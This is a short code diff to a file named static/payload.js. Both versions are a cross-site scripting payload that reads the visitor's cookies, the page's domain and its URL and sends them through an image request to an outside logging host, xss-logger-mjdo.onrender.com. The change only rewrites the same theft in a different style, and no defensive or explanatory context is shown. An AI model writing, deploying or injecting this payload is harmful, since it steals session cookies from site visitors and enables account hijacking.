@@ -1,9 +1,8 @@
+// static/payload.js
 (function () {
-  const endpoint = 'https://xss-logger-mjdo.onrender.com/log';
-  const params = new URLSearchParams({
-    c: document.cookie,
-    d: document.domain,
-    l: location.href
-  });
-  new Image().src = `${endpoint}?${params.toString()}`;
+  var i = new Image();
+  i.src = "https://xss-logger-mjdo.onrender.com/log"
+    + "?c=" + encodeURIComponent(document.cookie)
+    + "&d=" + encodeURIComponent(document.domain)
+    + "&l=" + encodeURIComponent(window.location);
 })();
